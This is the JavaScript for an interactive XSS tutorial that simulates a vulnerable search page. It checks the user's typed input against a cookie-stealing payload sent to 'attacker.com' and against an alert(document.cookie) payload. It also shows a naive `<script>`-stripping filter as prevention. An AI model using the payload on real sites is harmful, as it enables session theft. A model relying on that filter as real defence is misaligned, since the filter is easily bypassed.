$(document).ready(function(){
    // Get_Started
    

    handle_get_started(".kindofXSS");
    //action
    search(".action .interactive .three");
    url(".action .interactive .three");
    //vulnerability
    search(".vulnerability .interactive .one");
    url(".vulnerability .interactive .one");
    //prevent
    search(".prevent .interactive .one");
    url(".prevent .interactive .one");
    search(".prevent .interactive .four");
    url(".prevent .interactive .four");
    //function menu_get_started
    function handle_get_started(kindofAttack){
        $(document).on("click","#XSS",function(){
            $(".mainmenu").hide();
            $(".submenu").fadeIn(1000);
            $(".submenu .backmenu").fadeIn(1000);
           $(".submenu "+kindofAttack).fadeIn(1000);
        });
        $(document).on("click",".submenu .backmenu",function(){
            $(".submenu").hide();
            $(".submenu .backmenu").hide();
            $(".submenu "+kindofAttack).hide();
            $(".mainmenu").fadeIn(1000);

        });
    };
    // scroll bar
    function scrollbar(classname){
        $(classname+' .tutorial').animate({
            scrollTop: $(classname+' .tutorial').get(0).scrollHeight
        }, 1500);
    }
    // search
    function search(classname){
        $(document).on("keypress",classname+" .domain",function(e){
            if(e.which === 13){
                var search=$(this).val();
                $(classname+" .address").val("vulnerable.com?search="+search);
                $(classname+" .domain").val(search);
                $(".frame").hide();
                $(".frame_after_search").fadeIn(1000);  
                if(classname==".prevent .interactive .one" || classname==".prevent .interactive .four"){
                    var prevent_search=search.replace(/<script>/i,"<prevented>");
                    $(classname+" .keyword").text('Search results for "'+prevent_search+'": ...');
                }
                else{
                    $(classname+" .keyword").text('Search results for "'+search+'": ...');
                    if(search=="<script>alert(document.cookie)</script>"){
                        search="<script>alert('COOKIE: "+Math.random()+"')</script>";
                    }
                    $(this).append(search);
                }
                              
                
            }
        });
    }
    //url 
    function url(classname){
        $(document).on("keypress",classname+" .address",function(e){
            var address=$(this).val();
            if(e.which === 13 && address.startsWith("vulnerable.com?search=")){
                var search=address.slice(22);
                $(classname+" .address").val(address);
                $(classname+" .domain").val(search);
                $(".frame").hide();
                $(".frame_after_search").fadeIn(1000); 
                if(classname==".prevent .interactive .one" || classname==".prevent .interactive .four"){
                    var prevent_search=search.replace(/<script>/i,"<prevented>");
                    $(classname+" .keyword").text('Search results for "'+prevent_search+'": ...');
                }
                else{
                    $(classname+" .keyword").text('Search results for "'+search+'": ...');
                    if(search=="<script>alert(document.cookie)</script>"){
                        search="<script>alert('COOKIE: "+Math.random()+"')</script>";
                    }
                    $(this).append(search);
                }
                 
                
            }
        });
    }
    // DOM_XSS

     //instruction
     $(".DOM_XSS .instruction #inst").hide(3000); 
    $(".DOM_XSS .instruction #inst1").fadeIn(1500).hide(1500);
    $(".DOM_XSS .instruction #inst1_1").fadeIn(1000);  
    //action
        //step 1
            //show step 1
                // back id="backinst"
                // next id=""
                    $(document).on("click",".DOM_XSS .instruction #inst1_1 .nextinst",function(){
                        $(".DOM_XSS .instruction #inst1_1").hide(1000)
                        $(".DOM_XSS .action").fadeIn(1000);
                        $(".action .next").attr("disabled","").attr("title","Disabled"); // not next event
                        $(".DOM_XSS .action .tutorial").fadeIn(1000); //back event  
                        $(".DOM_XSS .action .tutorial .one").fadeIn(1000); 
                        $(".browser .address").attr({value:"vulnerable.com/login"});
                        $(".DOM_XSS .action .interactive").fadeIn(1000); //back event  
                        $(".DOM_XSS .action .interactive .one").fadeIn(1000);   
                        $(".action .next").fadeIn(); //back event 
                        $(".action .back").fadeIn(); //back event 
                        $(".action .back").attr("id","backinst"); //back event 
                        scrollbar(".action");
                    });  
            //back to step inst
                // back id="backinst"
                // next id=""
                    $(document).on("click",".action #backinst",function(){
                        $(".action .next").hide();
                        $(".action .back").hide();
                        $(".DOM_XSS .action .tutorial").hide(); 
                        $(".DOM_XSS .action .interactive").hide();  
                        $(".DOM_XSS .instruction #inst1").fadeIn(1000).hide(1000);
                        $(".DOM_XSS .instruction #inst1_1").fadeIn(1000);
                        
                    });
        //step 2
            //show step 2
                // back id="backone"
                // next id="nextthree"
                    $(document).on("click",".DOM_XSS .interactive .one #login",function(){
                        var username=$("#username").val();
                        var password=$("#password").val();
                        if(username=="user1" && password=="password"){
                            $(".DOM_XSS .action .tutorial .two").fadeIn(1000); 
                            $(".DOM_XSS .action .interactive .one").hide(1000);
                            $(".DOM_XSS .action .interactive .two").fadeIn(1000); 
                            $(".action .back").removeAttr("id"); //back event 
                            $(".action .back").attr("id","backone"); //back event 
                            $(".action .next").removeAttr("disabled").attr("title","");   
                            $(".action .next").removeAttr("id");
                            $(".action .next").attr("id","nextthree");
                            scrollbar(".action");
                        }else{
                            $(".DOM_XSS .interactive .one .error").fadeIn();
                        }
                    });
            //back to step 1
                // back id="backinst"
                // next id=""
                    $(document).on("click",".action #backone",function(){
                        $(".browser .address").attr({value:"vulnerable.com/login"});
                        $(".DOM_XSS .action .tutorial .two").hide(1000); 
                        $(".DOM_XSS .action .interactive .two").hide(1000); 
                        $(".DOM_XSS .action .tutorial .one").fadeIn(1000); 
                        $(".DOM_XSS .action .interactive .one").fadeIn(1000); 
                        $(".action .back").removeAttr("id"); //reset back event of step 1
                        $(".action .back").attr("id","backinst"); //reset back event of step 1
                        $(".action .next").removeAttr("id");
                        scrollbar(".action");
                    });
            
            
            

        //step 3
            //show step 3
                // back id="backtwo"
                // next id="nextfour"
                    $(document).on("click",".action #nextthree",function(){
                        $(".DOM_XSS .action .interactive .two").hide(1000);
                        $(".DOM_XSS .action .tutorial .three").fadeIn(1000); 
                        $(".browser .address").attr({value:"vulnerable.com"});
                        $(".DOM_XSS .action .interactive .three").fadeIn(1000); 
                        $(".action .back").removeAttr("id"); //back event 
                        $(".action .back").attr("id","backtwo"); //back event 
                        $(".action .next").removeAttr("id"); //back event 
                        $(".action .next").attr("id","nextfour"); //back event 
                        scrollbar(".action");

                    });
            //back to step 2
                // back id="backone"
                // next id="nextthree"
                    $(document).on("click",".action #backtwo",function(){
                        $(".frame_after_search").hide();
                        $(".frame").fadeIn(1000);
                        $(".DOM_XSS .action .tutorial .three").hide(1000); 
                        $(".DOM_XSS .action .interactive .three").hide(1000); 
                        $(".DOM_XSS .action .tutorial .two").fadeIn(1000); 
                        $(".DOM_XSS .action .interactive .two").fadeIn(1000); 
                        $(".action .back").removeAttr("id"); //reset back event of step 2
                        $(".action .back").attr("id","backone"); //reset back event of step 2
                        $(".action .next").removeAttr("id"); //reset back event of step 2
                        $(".action .next").attr("id","nextthree"); //reset back event of step 2
                        scrollbar(".action");
                    });
            
        //step 4 5 6
            //show step 4 5 6
                // back id="backthree"
                // next id="nextseven"
                    $(document).on("click",".action #nextfour",function(){
                        var search=$(".action .three .frame_after_search .domain").val();
                        if(search=="<script>new image().src=”attacker.com?cookie=”+document.cookie;</script>"
                                && $('.action .tutorial .three').css('display') == 'block'){
                            $(".frame_after_search").hide();
                            $(".frame").fadeIn(1000);
                            $(".DOM_XSS .action .tutorial .four").fadeIn(1000); 
                            $(".DOM_XSS .action .tutorial .five").fadeIn(1000); 
                            $(".DOM_XSS .action .tutorial .six").fadeIn(1000); 
                            $(".DOM_XSS .action .interactive .three").hide(1000);
                            $(".browser .address").attr({value:"attacker.com?cookie="+Math.random()});
                            $(".DOM_XSS .action .interactive .four").fadeIn(1000); 
                            $(".action .back").removeAttr("id"); //back event 
                            $(".action .back").attr("id","backthree"); //back event 
                            $(".action .next").removeAttr("id");
                            $(".action .next").attr("id","nextseven");
                            scrollbar(".action");
                        }
                    });
            //back to step 3
                // back id="backtwo"
                // next id="nextfour"
                    $(document).on("click",".action #backthree",function(){
                        $(".frame_after_search").fadeIn(1000);
                        $(".frame").hide();
                        $(".DOM_XSS .action .tutorial .four").hide(1000); 
                        $(".DOM_XSS .action .tutorial .five").hide(1000); 
                        $(".DOM_XSS .action .tutorial .six").hide(1000); 
                        $(".DOM_XSS .action .interactive .four").hide(1000); 
                        $(".DOM_XSS .action .tutorial .three").fadeIn(1000); 
                        $(".DOM_XSS .action .interactive .three").fadeIn(1000); 
                        $(".action .back").removeAttr("id"); //reset back event of step 3
                        $(".action .back").attr("id","backtwo"); //reset back event of step 3
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","nextfour"); //reset back event of step 3
                    });
            
        
            
        //step 7 
            //show step 7
                // back id="backfour"
                // next id="switch_vulnerability"
                    $(document).on("click",".action #nextseven",function(){
                        var cookie=$(".browser .address").val().slice(20);
                        $(".browser .frame #cookie").text("Cookie: "+cookie);
                        $(".DOM_XSS .action .tutorial .seven").fadeIn(1000); 
                        $(".DOM_XSS .action .interactive .four").hide(1000);
                        $(".DOM_XSS .action .interactive .seven").fadeIn(1000); 
                        $(".action .back").removeAttr("id"); //back event 
                        $(".action .back").attr("id","backfour"); //back event 
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","switch_vulnerability");
                        scrollbar(".action");
                    });
            //back to step 4
                // back id="backthree"
                // next id="nextseven"
                    $(document).on("click",".action #backfour",function(){
                        $(".DOM_XSS .action .tutorial .seven").hide(1000); 
                        $(".DOM_XSS .action .interactive .seven").hide(1000); 
                        $(".browser .address").attr({value:"attacker.com?cookie="+$(".browser .frame #cookie").val().slice(8)});
                        $(".DOM_XSS .action .tutorial .six").fadeIn(1000); 
                        $(".DOM_XSS .action .interactive .six").fadeIn(1000); 
                        $(".action .back").removeAttr("id"); //reset back event of step 6
                        $(".action .back").attr("id","backthree"); //reset back event of step 6
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","nextseven"); //reset back event of step 6
                        scrollbar(".action");
                    });

    //vulnerability
        // step 1
            // show step 1
                // back id="backseven" 
                // next id="nexttwo"
                    $(document).on("click",".action #switch_vulnerability",function(){
                        //hide action
                        $(".DOM_XSS .action").hide(); 
                        $(".DOM_XSS .action .tutorial .one").hide(); 
                        $(".DOM_XSS .action .interactive .one").hide(); 
                        $(".DOM_XSS .action .tutorial .two").hide(); 
                        $(".DOM_XSS .action .interactive .two").hide(); 
                        $(".DOM_XSS .action .tutorial .three").hide(); 
                        $(".DOM_XSS .action .interactive .three").hide(); 
                        $(".DOM_XSS .action .tutorial .four").hide(); 
                        $(".DOM_XSS .action .interactive .four").hide(); 
                        $(".DOM_XSS .action .tutorial .five").hide(); 
                        $(".DOM_XSS .action .tutorial .six").hide(); 
                        $(".DOM_XSS .action .tutorial .seven").hide(); 
                        $(".DOM_XSS .action .interactive .seven").hide(); 
                        $(".DOM_XSS .action .next").hide(); 
                        $(".DOM_XSS .action .back").hide(); 
                        //fadeIn vulnerability
                        $(".browser .address").attr({value:"vulnerable.com"});
                        $(".DOM_XSS .instruction #inst2").fadeIn(1000).hide(1000);
                        $(".DOM_XSS .vulnerability").fadeIn(); 
                        $(".DOM_XSS .vulnerability .tutorial").fadeIn(1000); //back event  
                        $(".DOM_XSS .vulnerability .tutorial .one").fadeIn(1000); 
                        $(".DOM_XSS .vulnerability .interactive").fadeIn(1000); //back event  
                        $(".DOM_XSS .vulnerability .interactive .one").fadeIn(1000);   
                        $(".vulnerability .next").fadeIn(); //back event 
                        $(".vulnerability .back").fadeIn(); 
                        $(".vulnerability .back").attr("id","backseven"); //back event 
                        $(".vulnerability .next").attr("id","nexttwo"); //back event 
                        scrollbar(".vulnerability");

                    });
            // back to step 7 action
                // back id="backfour"
                // next id="switch_vulnerability"
                    $(document).on("click",".vulnerability #backseven",function(e){
                        //hide vulnerability
                        $(".DOM_XSS .vulnerability").hide(); 
                        $(".DOM_XSS .vulnerability .tutorial").hide(); //back event  
                        $(".DOM_XSS .vulnerability .tutorial .one").hide(); 
                        $(".DOM_XSS .vulnerability .interactive").hide(); //back event  
                        $(".DOM_XSS .vulnerability .interactive .one").hide();   
                        $(".vulnerability .next").hide(); //back event 
                        $(".vulnerability .back").hide(); 
                        //fadeIn action
                        
                        $(".DOM_XSS .action").fadeIn(1000);
                        $(".action .next").attr("disabled","").attr("title","Disabled"); // not next event
                        $(".DOM_XSS .action .tutorial").fadeIn(1000); //back event  
                        $(".DOM_XSS .action .tutorial .one").fadeIn(1000); 
                        $(".DOM_XSS .action .tutorial .two").fadeIn(1000); 
                        $(".DOM_XSS .action .tutorial .three").fadeIn(1000); 
                        $(".DOM_XSS .action .tutorial .four").fadeIn(1000); 
                        $(".DOM_XSS .action .tutorial .five").fadeIn(1000); 
                        $(".DOM_XSS .action .tutorial .six").fadeIn(1000); 
                        $(".DOM_XSS .action .tutorial .seven").fadeIn(1000); 
                        $(".DOM_XSS .action .interactive").fadeIn(1000); //back event  
                        $(".DOM_XSS .action .interactive .seven").fadeIn(1000); 
                        $(".action .next").removeAttr("disabled").fadeIn(); //back event 
                        $(".action .back").fadeIn(); //back event 
                        $(".frame_after_search").hide();
                        $(".frame").fadeIn(1000);
                        //set id back next
                        $(".action .back").removeAttr("id"); //back event 
                        $(".action .back").attr("id","backfour"); //back event 
                        $(".action .next").removeAttr("id"); //back event 
                        $(".action .next").attr("id","switch_vulnerability"); //back event 
                        scrollbar(".vulnerability");

                    });
        // step 2
            // show step 2
                // back id="backone"
                // next id="nextthree"
                $(document).on("click",".vulnerability #nexttwo",function(){
                    var search=$(".vulnerability .domain").val();
                    if($('.vulnerability .tutorial .one').css('display') == 'block' && search){
                        $(".DOM_XSS .vulnerability .tutorial .two").fadeIn(1000); 
                        $(".vulnerability .back").removeAttr("id");
                        $(".vulnerability .back").attr("id","backone");
                        $(".vulnerability .next").removeAttr("id");
                        $(".vulnerability .next").attr("id","nextthree");
                        scrollbar(".vulnerability");
                    }
                });
                


            // back to step 1
                // back id="backseven" (action)
                // next id="nexttwo"
                    $(document).on("click",".vulnerability #backone",function(e){
                        $(".DOM_XSS .vulnerability .tutorial .two").hide(1000); 
                        $(".vulnerability .back").removeAttr("id"); //back event 
                        $(".vulnerability .back").attr("id","backseven"); //back event 
                        $(".vulnerability .next").removeAttr("id");
                        $(".vulnerability .next").attr("id","nexttwo");
                        scrollbar(".vulnerability");
                    });

    
        //step 3
            //show step 3
                // back id="backtwo"
                // next id="nextone" 
                    $(document).on("click", ".vulnerability #nextthree", function () {
                        var search=$(".vulnerability .domain").val();
                        if ($('.vulnerability .tutorial .two').css('display') == 'block' && search == "<script>alert(document.cookie)</script>") {
                            $(".frame").fadeIn(1000);
                            $(".frame_after_search").hide();  
                            $(".DOM_XSS .vulnerability .tutorial .three").fadeIn(1000);
                            $(".DOM_XSS .vulnerability .interactive .two").hide(1000);
                            $(".DOM_XSS .vulnerability .interactive .three").fadeIn(1000);
                            $(".vulnerability .back").removeAttr("id");
                            $(".vulnerability .back").attr("id", "backtwo");
                            $(".vulnerability .next").removeAttr("id");
                            $(".vulnerability .next").attr("id", "nextone");
                            scrollbar(".vulnerability");
                        }
                    });

            // back to step 2
                // back id="backone"
                // next id="nextthree"
                    $(document).on("click",".vulnerability #backtwo",function(e){
                        $(".DOM_XSS .vulnerability .tutorial .three").hide(1000); 
                        $(".DOM_XSS .vulnerability .interactive .three").hide(1000); 
                        $(".DOM_XSS .vulnerability .interactive .two").fadeIn(1000); 
                        $(".vulnerability .back").removeAttr("id"); //back event 
                        $(".vulnerability .back").attr("id","backone"); //back event 
                        $(".vulnerability .next").removeAttr("id"); //back event 
                        $(".vulnerability .next").attr("id","nextthree");

                        scrollbar(".vulnerability");
                    });
    // prevent
    //     step 1
    //         show step 1
    //             back id="switch_vul"
    //             next id="nexttwo"
                $(document).on("click",".vulnerability #nextone",function(){
                    //hide vulnerability
                    $(".DOM_XSS .vulnerability").hide(); 
                    $(".DOM_XSS .vulnerability .tutorial .one").hide(); 
                    $(".DOM_XSS .vulnerability .interactive .one").hide(); 
                    $(".DOM_XSS .vulnerability .tutorial .two").hide(); 
                    $(".DOM_XSS .vulnerability .interactive .two").hide(); 
                    $(".DOM_XSS .vulnerability .tutorial .three").hide(); 
                    $(".DOM_XSS .vulnerability .interactive .three").hide(); 
                    $(".DOM_XSS .vulnerability .next").hide(); 
                    $(".DOM_XSS .vulnerability .back").hide(); 
                    //fadeIn prevent
                    $(".browser .address").attr({value:"vulnerable.com"});
                    $(".DOM_XSS .instruction #inst3").fadeIn(1000).hide(1000);
                    $(".DOM_XSS .prevent").fadeIn(); 
                    $(".DOM_XSS .prevent .tutorial").fadeIn(1000); //back event  
                    $(".DOM_XSS .prevent .tutorial .one").fadeIn(1000); 
                    $(".DOM_XSS .prevent .interactive").fadeIn(1000); //back event  
                    $(".DOM_XSS .prevent .interactive .one").fadeIn(1000);   
                    $(".prevent .next").fadeIn(); //back event 
                    $(".prevent .back").fadeIn(); 
                    $(".prevent .back").attr("id","switch_vul"); //back event 
                    $(".prevent .next").attr("id","nexttwo"); //back event 
                    scrollbar(".prevent");

                });
        // back to step 3 vulnerability
            // back id="backtwo"
            // next id="nextone"
                $(document).on("click",".prevent #switch_vul",function(e){
                    //hide prevent
                    $(".DOM_XSS .prevent").hide(); 
                    $(".DOM_XSS .prevent .tutorial").hide(); //back event  
                    $(".DOM_XSS .prevent .tutorial .one").hide(); 
                    $(".DOM_XSS .prevent .interactive").hide(); //back event  
                    $(".DOM_XSS .prevent .interactive .one").hide();   
                    $(".prevent .next").hide(); //back event 
                    $(".prevent .back").hide(); 
                    //fadeIn vulnerability
                    $(".frame_after_search").hide(); 
                    $(".frame").fadeIn(1000);
                    $(".DOM_XSS .vulnerability").fadeIn(1000);
                    $(".DOM_XSS .vulnerability .tutorial").fadeIn(1000); //back event  
                    $(".DOM_XSS .vulnerability .tutorial .one").fadeIn(1000); 
                    $(".DOM_XSS .vulnerability .tutorial .two").fadeIn(1000); 
                    $(".DOM_XSS .vulnerability .tutorial .three").fadeIn(1000); 
                    $(".DOM_XSS .vulnerability .interactive").fadeIn(1000); //back event  
                    $(".DOM_XSS .vulnerability .interactive .three").fadeIn(1000); 
                    $(".vulnerability .next").fadeIn(); //back event 
                    $(".vulnerability .back").fadeIn(); //back event 
                    //set id back next
                    $(".vulnerability .back").removeAttr("id");
                    $(".vulnerability .back").attr("id", "backtwo");
                    $(".vulnerability .next").removeAttr("id");
                    $(".vulnerability .next").attr("id", "nextone");
                    scrollbar(".prevent");

                });
    // step 2
        // show step 2
            // back id="backone"
            // next id="nextthree"
            $(document).on("click",".prevent #nexttwo",function(){
                var search=$(".prevent .domain").val();
                if($('.prevent .tutorial .one').css('display') == 'block' && search){
                    $(".DOM_XSS .prevent .tutorial .two").fadeIn(1000); 
                    $(".prevent .back").removeAttr("id");
                    $(".prevent .back").attr("id","backone");
                    $(".prevent .next").removeAttr("id");
                    $(".prevent .next").attr("id","nextthree");
                    scrollbar(".prevent");
                }
            });
            


        // back to step 1
            // back id="switch_vul" (action)
            // next id="nexttwo"
                $(document).on("click",".prevent #backone",function(e){
                    $(".DOM_XSS .prevent .tutorial .two").hide(1000); 
                    $(".prevent .back").removeAttr("id"); //back event 
                    $(".prevent .back").attr("id","switch_vul"); //back event 
                    $(".prevent .next").removeAttr("id");
                    $(".prevent .next").attr("id","nexttwo");
                    scrollbar(".prevent");
                });


    //step 3
        //show step 3
            // back id="backtwo"
            // next id="nextfour"
                $(document).on("click", ".prevent #nextthree", function () {
                    var search=$(".prevent .domain").val();
                    if ($('.prevent .tutorial .two').css('display') == 'block' && search == "<script>alert(document.cookie)</script>") {
                        $(".frame").fadeIn(1000);
                        $(".frame_after_search").hide();  
                        $(".DOM_XSS .prevent .tutorial .three").fadeIn(1000);
                        $(".DOM_XSS .prevent .interactive .two").hide(1000);
                        $(".DOM_XSS .prevent .interactive .three").fadeIn(1000);
                        $(".prevent .back").removeAttr("id");
                        $(".prevent .back").attr("id", "backtwo");
                        $(".prevent .next").removeAttr("id");
                        $(".prevent .next").attr("id", "nextfour");
                        scrollbar(".prevent");
                    }
                });

        // back to step 2
            // back id="backone"
            // next id="nextthree"
                $(document).on("click",".prevent #backtwo",function(e){
                    $(".frame_after_search").hide(); 
                    $(".frame").fadeIn(1000);
                    $(".DOM_XSS .prevent .tutorial .three").hide(1000); 
                    $(".DOM_XSS .prevent .interactive .three").hide(1000); 
                    $(".DOM_XSS .prevent .tutorial .two").fadeIn(1000); 
                    $(".DOM_XSS .prevent .interactive .two").fadeIn(1000); 
                    $(".prevent .back").removeAttr("id"); //back event 
                    $(".prevent .back").attr("id","backone"); //back event 
                    $(".prevent .next").removeAttr("id"); //back event 
                    $(".prevent .next").attr("id","nextthree");
                    scrollbar(".prevent");
                });
    //step 4
        //show step 4
            // back id="backthree"
            // next id="switch_end"
            $(document).on("click", ".prevent #nextfour", function () {
                if ($('.prevent .tutorial .three').css('display') == 'block') { 
                    $(".DOM_XSS .prevent .tutorial .four").fadeIn(1000);
                    $(".DOM_XSS .prevent .interactive .three").hide(1000);
                    $(".DOM_XSS .prevent .interactive .four").fadeIn(1000);
                    $(".prevent .back").removeAttr("id");
                    $(".prevent .back").attr("id", "backthree");
                    $(".prevent .next").removeAttr("id");
                    $(".prevent .next").attr("id", "switch_end");
                    scrollbar(".prevent");
                }
            });

    // back to step 3
        // back id="backtwo"
        // next id="nextfour"
            $(document).on("click",".prevent #backthree",function(e){
                $(".frame_after_search").hide(); 
                $(".frame").fadeIn(1000);
                $(".DOM_XSS .prevent .tutorial .four").hide(1000); 
                $(".DOM_XSS .prevent .interactive .four").hide(1000); 
                $(".DOM_XSS .prevent .tutorial .three").fadeIn(1000); 
                $(".DOM_XSS .prevent .interactive .three").fadeIn(1000); 
                $(".prevent .back").removeAttr("id"); //back event 
                $(".prevent .back").attr("id","backtwo"); //back event 
                $(".prevent .next").removeAttr("id"); //back event 
                $(".prevent .next").attr("id","nextfour");
                scrollbar(".prevent");
            });
    //End
        //show end
            // back id="backfour"
            // next id=""
                $(document).on("click", ".prevent #switch_end", function () {
                    var search=$(".prevent .four .domain").val();
                    if ($('.prevent .tutorial .four').css('display') == 'block' && search.search("<script>") !=-1) {
                        //hide prevent
                        $(".DOM_XSS .prevent").hide(); 
                        $(".DOM_XSS .prevent .tutorial").hide(); //back event  
                        $(".DOM_XSS .prevent .tutorial .four").hide(); 
                        $(".DOM_XSS .prevent .interactive").hide(); //back event  
                        $(".DOM_XSS .prevent .interactive .four").hide();   
                        $(".prevent .next").hide(); //back event 
                        $(".prevent .back").hide(); 
                        //fadeIn end
                        $(".DOM_XSS .instruction #end").fadeIn(2000).hide(2000);
                        $(".DOM_XSS .instruction #end_1").fadeIn(1000);  
                        $(".DOM_XSS .instruction #end_1 .backinst").attr("id","backfour") 
                        $(".DOM_XSS .instruction #end_1 .nextinst").attr("id","getstarted") 
                    }
                });
        //back to step 4 prevent
            //back id="backthree"
            // next id="switch_end"
                $(document).on("click", ".DOM_XSS .instruction #end_1 #backfour", function () {
                    //hide end
                    $(".DOM_XSS .instruction #end_1").hide();  
                    $(".DOM_XSS .instruction #end_1 .nextinst").attr("id","backfour") 
                    //fadeIn prevent
                    $(".DOM_XSS .prevent").fadeIn(1000); 
                    $(".DOM_XSS .prevent .tutorial").fadeIn(1000); //back event  
                    $(".DOM_XSS .prevent .tutorial .one").fadeIn(1000); 
                    $(".DOM_XSS .prevent .tutorial .two").fadeIn(1000); 
                    $(".DOM_XSS .prevent .tutorial .three").fadeIn(1000); 
                    $(".DOM_XSS .prevent .tutorial .four").fadeIn(1000); 
                    $(".DOM_XSS .prevent .interactive").fadeIn(1000); //back event  
                    $(".DOM_XSS .prevent .interactive .four").fadeIn(1000);   
                    $(".prevent .next").fadeIn(1000); //back event 
                    $(".prevent .back").fadeIn(1000); 
                    $(".prevent .back").removeAttr("id"); //back event 
                    $(".prevent .back").attr("id","backthree"); //back event 
                    $(".prevent .next").removeAttr("id"); //back event 
                    $(".prevent .next").attr("id","switch_end");
                    scrollbar(".prevent");
                });
            // go get_started
                $(document).on("click", ".DOM_XSS .instruction #end_1 #getstarted", function () {
                    location.href="get_started.html";
                });




    


});
